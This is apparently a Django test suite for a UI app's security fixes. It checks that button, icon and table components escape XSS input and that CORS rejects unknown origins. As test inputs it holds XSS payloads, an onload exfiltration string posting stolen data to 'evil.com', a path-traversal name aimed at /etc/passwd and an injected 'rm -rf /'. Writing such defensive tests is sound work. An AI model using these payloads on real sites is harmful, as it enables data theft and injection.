"""
🔒 UI App Security Fix Tests
Tests all security enhancements implemented for the UI components.
"""

from pathlib import Path

from django.contrib.auth import get_user_model
from django.template import Context, Template
from django.test import SimpleTestCase, TestCase, override_settings
from django.utils.html import escape

from apps.ui.templatetags.ui_components import button, icon

User = get_user_model()


class ButtonComponentXSSTests(TestCase):
    """🔒 Tests for XSS prevention in button component"""

    def test_button_attrs_are_sanitized(self):
        """Test that button attrs are properly escaped to prevent XSS"""
        # Malicious attrs that should be escaped
        malicious_attrs = 'onclick="alert(\'XSS\')" data-evil="<script>alert(\'XSS\')</script>"'

        context = button(
            text="Test Button",
            attrs=malicious_attrs
        )

        # The attrs should be escaped, not marked as safe
        expected_escaped = escape(malicious_attrs)
        self.assertEqual(context['attrs'], expected_escaped)

        # Verify no raw HTML is present
        self.assertNotIn('onclick="alert', context['attrs'])
        self.assertNotIn('<script>', context['attrs'])

        # Verify proper escaping
        self.assertIn('&lt;script&gt;', context['attrs'])
        self.assertIn('&#x27;XSS&#x27;', context['attrs'])

    def test_button_empty_attrs_handled_safely(self):
        """Test that empty attrs don't cause issues"""
        context = button(text="Test Button", attrs="")
        self.assertEqual(context['attrs'], "")

        context = button(text="Test Button", attrs=None)
        self.assertEqual(context['attrs'], "")

    def test_button_template_does_not_use_safe_filter(self):
        """Test that the button template no longer uses |safe filter unsafely"""
        # Create a template that uses the button component
        template_content = """
        {% load ui_components %}
        {% button "Test" attrs=malicious_attrs %}
        """

        template = Template(template_content)
        context = Context({
            'malicious_attrs': 'onclick="alert(\'XSS\')"'
        })

        rendered = template.render(context)

        # Should not contain unescaped malicious content
        self.assertNotIn('onclick="alert', rendered)

        # Should contain escaped content (if attrs are present in output)
        if 'onclick' in rendered:
            self.assertIn('onclick=&quot;', rendered)

    def test_button_with_complex_malicious_attrs(self):
        """Test button with complex malicious attributes"""
        complex_malicious = '''onload="fetch('/api/steal-data').then(r=>r.json()).then(d=>fetch('/evil.com',{method:'POST',body:JSON.stringify(d)}))" style="background:url('javascript:alert(1)')" data-x="</script><script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>"'''

        context = button(text="Test", attrs=complex_malicious)

        # All malicious content should be escaped
        escaped_attrs = context['attrs']

        # Verify JavaScript is escaped
        self.assertNotIn('onload=', escaped_attrs)
        self.assertNotIn('javascript:', escaped_attrs)
        self.assertNotIn('<script>', escaped_attrs)
        self.assertNotIn('eval(', escaped_attrs)

        # Verify it contains escaped versions
        self.assertIn('&lt;script&gt;', escaped_attrs)

    def test_button_attrs_numeric_and_safe_values(self):
        """Test that safe numeric values and standard attributes work correctly"""
        safe_attrs = 'data-count="5" tabindex="1" aria-label="Safe button"'

        context = button(text="Safe Button", attrs=safe_attrs)

        # Safe attributes should still be escaped (but will look the same)
        self.assertIn('data-count=&quot;5&quot;', context['attrs'])
        self.assertIn('tabindex=&quot;1&quot;', context['attrs'])


class IconComponentSecurityTests(TestCase):
    """Tests for security of inline SVG icon component"""

    def test_icon_uses_format_html_not_f_strings(self):
        """Test that icon function produces safe inline SVG output"""
        result = icon('dashboard')

        # Should produce a valid inline SVG with path data
        self.assertIn('<svg', result)
        self.assertIn('viewBox="0 0 24 24"', result)
        self.assertIn('<path', result)
        self.assertIn('aria-hidden="true"', result)

    def test_icon_name_validation(self):
        """Test that unknown icon names return empty string (fail-safe)"""
        malicious_name = '<script>alert("XSS")</script>'

        result = icon(malicious_name)

        # Unknown names return empty string
        self.assertEqual(result, '')

    def test_icon_css_class_sanitization(self):
        """Test that CSS classes are properly escaped"""
        malicious_css = 'text-red-500"><script>alert("XSS")</script><span class="'

        result = icon('dashboard', css_class=malicious_css)

        # Should not contain unescaped malicious content
        self.assertNotIn('<script>alert', result)
        self.assertNotIn('"><script>', result)

        # Should contain escaped version
        self.assertIn('&lt;script&gt;', result)

    def test_icon_regex_validation_blocks_dangerous_names(self):
        """Test that unknown/dangerous icon names return empty"""
        dangerous_names = [
            '../../../etc/passwd',
            'icon;rm -rf /',
            'icon" onload="alert(1)',
            'icon\x00null',
        ]

        for dangerous_name in dangerous_names:
            result = icon(dangerous_name)

            # Unknown names return empty string
            self.assertEqual(result, '')

    def test_icon_size_parameter_safety(self):
        """Test that size parameter is handled safely"""
        malicious_size = '"><script>alert("XSS")</script><div class="'

        result = icon('dashboard', size=malicious_size)

        # Should not contain malicious content
        self.assertNotIn('<script>alert', result)

        # Should fall back to default size classes
        self.assertIn('w-5 h-5', result)  # Default md size


class TemplateSecurityTests(TestCase):
    """🔒 Tests for general template security improvements"""

    def test_button_template_conditional_attrs_rendering(self):
        """Test that attrs are only rendered when present and safe"""
        # Test with no attrs
        context = button(text="Test", attrs="")
        self.assertEqual(context['attrs'], "")

        # Test template rendering with no attrs
        template = Template("""
            {% load ui_components %}
            {% button "Test" %}
        """)
        rendered = template.render(Context())

        # Should not contain empty attrs in the final output
        # The template should use {% if attrs %} condition
        self.assertTrue('button' in rendered or 'Test' in rendered)

    def test_no_mark_safe_usage_in_attrs(self):
        """Verify that attrs are not marked as safe in the template"""
        malicious_attrs = '<img src=x onerror=alert(1)>'

        context = button(text="Test", attrs=malicious_attrs)

        # The context attrs should be escaped string, not SafeString
        from django.utils.safestring import SafeString
        self.assertIsInstance(context['attrs'], str)
        self.assertNotIsInstance(context['attrs'], SafeString)

        # And should contain escaped content
        self.assertIn('&lt;img', context['attrs'])

    def test_xss_prevention_comprehensive_scenarios(self):
        """Test comprehensive XSS prevention scenarios"""
        xss_payloads = [
            '"><img src=x onerror=alert(1)>',
            "' onmouseover='alert(1)' data-x='",
            'javascript:alert(1)',
            '&lt;script&gt;alert(1)&lt;/script&gt;',  # Already encoded
            'data:text/html,<script>alert(1)</script>',
            '&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;',  # Encoded javascript:
        ]

        for payload in xss_payloads:
            context = button(text="Test", attrs=payload)

            # None of these should result in executable JavaScript
            escaped_attrs = context['attrs']

            # Common dangerous patterns should not be present unescaped
            dangerous_patterns = [
                'javascript:',
                'onerror=',
                'onmouseover=',
                '<script>',
                'alert(1)',
            ]

            for pattern in dangerous_patterns:
                if pattern in payload and pattern not in ['&lt;script&gt;', '&lt;/script&gt;']:
                    # Check that the pattern is properly escaped - it should not appear as executable code
                    # If it appears in escaped content, that's actually good (safe)
                    if pattern in escaped_attrs:
                        # Verify it's escaped, not executable (check for HTML entity escaping)
                        if not any(esc in escaped_attrs for esc in ['&lt;', '&gt;', '&quot;', '&#x27;']):
                            self.fail(f"Dangerous pattern '{pattern}' found unescaped in output for payload: {payload}")


_CORS_TEST_MIDDLEWARE = [
    "corsheaders.middleware.CorsMiddleware",
    "django.middleware.security.SecurityMiddleware",
    "django.contrib.sessions.middleware.SessionMiddleware",
    "django.middleware.common.CommonMiddleware",
    "django.middleware.csrf.CsrfViewMiddleware",
    "django.contrib.auth.middleware.AuthenticationMiddleware",
    "django.contrib.messages.middleware.MessageMiddleware",
]


class CORSSecurityTests(TestCase):
    """🔒 Tests for CORS configuration security"""

    def test_cors_settings_documented(self):
        """Dev settings use explicit CORS origins, not CORS_ALLOW_ALL_ORIGINS."""
        from config.settings import dev

        self.assertTrue(hasattr(dev, "CORS_ALLOWED_ORIGINS"))
        self.assertFalse(
            getattr(dev, "CORS_ALLOW_ALL_ORIGINS", False),
            "Development must not use CORS_ALLOW_ALL_ORIGINS (invalid with credentials)",
        )

    @override_settings(
        MIDDLEWARE=_CORS_TEST_MIDDLEWARE,
        CORS_ALLOWED_ORIGINS=["http://localhost:8701"],
        CORS_ALLOW_CREDENTIALS=True,
    )
    def test_cors_rejects_unknown_origin(self):
        """CorsMiddleware blocks requests from unauthorized origins."""
        response = self.client.get("/accounts/login/", HTTP_ORIGIN="https://evil.com")
        self.assertNotIn("Access-Control-Allow-Origin", response)

    @override_settings(
        MIDDLEWARE=_CORS_TEST_MIDDLEWARE,
        CORS_ALLOWED_ORIGINS=["http://localhost:8701"],
        CORS_ALLOW_CREDENTIALS=True,
    )
    def test_cors_allows_portal_origin(self):
        """CorsMiddleware allows requests from Portal origin."""
        response = self.client.get("/accounts/login/", HTTP_ORIGIN="http://localhost:8701")
        self.assertEqual(response.get("Access-Control-Allow-Origin"), "http://localhost:8701")

    @override_settings(
        MIDDLEWARE=_CORS_TEST_MIDDLEWARE,
        CORS_ALLOWED_ORIGINS=["http://localhost:8701"],
        CORS_ALLOW_CREDENTIALS=True,
    )
    def test_cors_preflight_returns_allow_methods(self):
        """CORS preflight OPTIONS request returns allowed methods for Portal origin."""
        response = self.client.options(
            "/accounts/login/",
            HTTP_ORIGIN="http://localhost:8701",
            HTTP_ACCESS_CONTROL_REQUEST_METHOD="POST",
        )
        self.assertEqual(response.status_code, 200)
        self.assertIn("Access-Control-Allow-Methods", response)


"""H5: table_enhanced must escape click_url in onclick handlers."""


class TableEnhancedXSSTests(SimpleTestCase):
    """H5: click_url must use |escapejs, click_js must not be raw in onclick."""

    def test_click_url_uses_escapejs(self):
        template_path = Path(__file__).resolve().parents[2] / "templates/components/table_enhanced.html"
        content = template_path.read_text()
        self.assertIn("click_url|escapejs", content)
        self.assertNotIn("window.location.href='{{ row.click_url }}'", content)

    def test_click_js_not_raw_in_onclick(self):
        template_path = Path(__file__).resolve().parents[2] / "templates/components/table_enhanced.html"
        content = template_path.read_text()
        self.assertNotIn('onclick="{{ row.click_js }}"', content)
